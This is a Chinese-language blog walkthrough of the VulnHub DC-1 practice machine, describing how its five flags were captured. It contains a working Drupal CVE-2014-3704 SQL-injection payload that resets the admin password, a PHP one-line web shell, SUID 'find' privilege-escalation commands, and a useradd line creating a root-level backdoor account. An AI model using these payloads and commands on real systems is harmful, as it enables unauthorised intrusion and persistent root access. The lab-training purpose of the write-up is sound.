---
title: VulnHub-DC1(一)
abbrlink: 55500
date: 2020-10-29 16:05:41
categories: [VulnHub]
---
### 前言
　　Vulnhub是一个提供各种漏洞的靶机网站，本章靶机是入门级别的dc1，<a href="https://www.vulnhub.com/entry/dc-1,292/">下载</a>，我们的目标是要找到5个flag。下载后是的ova文件导入VMware Workstation15（低版本不支持导入ova文件）。
<!-- more -->

### 信息搜集
　　打开靶机后，是不知道密码的，第一次打靶的我还很疑惑为什么不给密码......
　　<img src="https://s1.ax1x.com/2020/10/29/BGvebT.png">
　　`nmap -sn 10.16.122.0/24`得到靶机ip为10.16.122.6
　　<img src="https://s1.ax1x.com/2020/10/29/BGxVWd.png">
　　`nmap -A --script=vuln 10.16.122.6`探测主机信息
　　开放了80和22端口，并且存在cve-2014-3704，如果你觉得自己人品好就去爆破吧(ಡωಡ)
　　<img src="https://s1.ax1x.com/2020/10/29/BGzeNF.png">
### 漏洞利用
　　使用burp截取到登陆请求包，并发送到Repeater
　　<img src="https://s1.ax1x.com/2020/10/29/BJSoQA.png">
　　cve-2014-3704这个漏洞是sql注入，能直接数据库添加用户名和密码
　　payload

```
name[0%20;update+users+set+name%3d'root'+,+pass+%3d+'$S$DkIkdKLIvRK0iVHm99X7B/M8QC17E1Tp/kMOd1Ie8V/PgWjtAZld'+where+uid+%3d+'1';;#%20%20]=test3&name[0]=test&pass=shit2&test2=test&form_build_id=&form_id=user_login_block&op=Log+in
```
　　将上述payload贴进来，发包后，将会创建一个用户名为:root 密码:thanks的账户，如果登陆失败，多发几次包即可。
　　<img src="https://s1.ax1x.com/2020/10/29/BJPtl4.png">
### flag3
　　登陆进来后，点击最上面的content获取到flag3
　　<img src="https://s1.ax1x.com/2020/10/29/BJFXF0.png">
　　flag3提示用find -exec，想到用suid提权
　　<img src="https://s1.ax1x.com/2020/10/29/BJk9OJ.png">
　　来到modules，开启php filter
　　<img src="https://s1.ax1x.com/2020/10/29/BJkH1O.png">
　　新建articel文章，并写入php一句话木马<?php @eval($_POST["x"]); ?>，底下的text format换成PHP code
　　<img src="https://s1.ax1x.com/2020/10/29/BJADDH.png">
　　文章成功发布后，使用蚁剑连接
### flag1
　　ls后，直接在当前目录发现flag1.txt
　　<img src="https://s1.ax1x.com/2020/10/29/BJMM2n.png">
　　flag1提示查看站点配置文件
　　<img src="https://s1.ax1x.com/2020/10/29/BJMDr6.png">
### flag2
　　Drupal的默认配置文件为  /var/www/sites/default/settings.php，查看后
　　<img src="https://s1.ax1x.com/2020/10/29/BJQolR.png">
　　获取到数据库信息，告诉你可以选择爆破，我反正不会这样做
### flag4
　　使用find / -name flag*.txt命令，直接来查找flag文件，获取到flag4
　　<img src="https://s1.ax1x.com/2020/10/29/BJldnx.png">
　　你能成功访问到/root下的flag吗？恩，我能！
　　<img src="https://s1.ax1x.com/2020/10/29/BJlc3d.png">

### 提权
　　看来接下来就是要提权了
　　<img src="https://s1.ax1x.com/2020/10/29/BJljbV.png">
　　uname -a后得到Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux
　　尝试使用脏牛提权，好像make版本太低
　　<img src="https://s1.ax1x.com/2020/10/29/BJ1Eb6.png">
　　换个思路，前面提示说suid提权，试试
　　
```bash
#以下命令将尝试查找具有root权限的SUID的文件，不同系统适用于不同的命令，一个一个试
find / -perm -u=s -type f 2>/dev/null
find / -user root -perm -4000-print2>/dev/null
find / -user root -perm -4000-exec ls -ldb {} \;
```
　　这里前面提示的find
　　<img src="https://s1.ax1x.com/2020/10/29/BJ3peP.png">
　　root权限
　　<img src="https://s1.ax1x.com/2020/10/29/BJ3lYF.png">
　　如果Find命令也是以Suid权限运行的话，则将通过find执行的所有命令都会以root权限执行。

```bash
touch test
find test -exec whoami \;
```
　　<img src="https://s1.ax1x.com/2020/10/29/BJ3L7V.png">

### flag5
　　<img src="https://s1.ax1x.com/2020/10/29/BJdYXF.png">
### 结尾
　　既然都是root，哪就添加一个用户吧
　　一句话添加用户并且是root权限，用户名:lion 密码:123456

<pre>
useradd -p`openssl passwd -1 -salt 'salt' 123456` lion -o -u 0 -g root -G root -s /bin/bash -d /home/test
</pre>

　　<img src="https://s1.ax1x.com/2020/10/29/BJwg2V.png">
　　

